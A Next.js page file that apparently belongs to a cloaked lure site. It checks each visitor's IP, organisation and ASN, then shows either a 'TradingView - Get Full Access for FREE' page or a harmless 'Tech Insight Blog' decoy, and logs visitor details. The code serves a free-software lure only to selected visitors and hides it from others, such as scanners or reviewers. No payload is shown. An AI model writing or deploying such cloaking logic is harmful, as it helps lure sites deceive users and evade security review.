import ViewOne from "@/app/view-one";
import ViewTwo from "@/app/view-two";
import type { Metadata } from "next";
import { headers } from "next/headers";
import { analyzeIpAccess } from "@/lib/ip-analysis";
import { saveAccessLog } from "@/lib/db";

// Function chung để kiểm tra điều kiện (dùng cho cả metadata và component)
async function checkCondition(headersList: Headers): Promise<{ allowed: boolean; result: Awaited<ReturnType<typeof analyzeIpAccess>> }> {
  try {
    const result = await analyzeIpAccess(headersList);
    return { allowed: result.allowed, result };
  } catch (error) {
    console.error("Error in checkCondition:", error);
    return { 
      allowed: false, 
      result: { allowed: false, reason: 'ERROR', details: { ip: 'unknown' } }
    };
  }
}

// Function để tạo metadata động dựa trên điều kiện
export async function generateMetadata(): Promise<Metadata> {
  const headersList = await headers();
  const { allowed } = await checkCondition(headersList);

  if (allowed) {
    return {
      title: "TradingView - Get Full Access for FREE",
      description: "Get Full Access to TradingView Desktop for FREE. Experience extra power, extra speed and extra flexibility.",
    };
  } else {
    return {
      title: "Tech Insight Blog - Alternative View",
      description: "Tech Insight Blog alternative view",
    };
  }
}

export default async function Home() {
  const headersList = await headers();
  const { allowed, result } = await checkCondition(headersList);
  
  // Lấy user agent từ headers
  const userAgent = headersList.get('user-agent') || null;
  
  // Lưu access log (không await để không block rendering)
  const ip = result.details?.ip || 'unknown';
  saveAccessLog({
    ip,
    view: allowed ? 'ViewOne' : 'ViewTwo',
    block_reason: result.reason || null,
    organization: result.details?.organization || null,
    asn: result.details?.asn || null,
    user_agent: userAgent,
  }).catch((error) => {
    // Log error nhưng không block rendering
    console.error('Error saving access log:', error);
  });

  return (
    <div className="min-h-screen flex flex-col">
      <main className="overflow-hidden">
        {allowed ? <ViewOne /> : <ViewTwo />}
      </main>
    </div>
  );
}
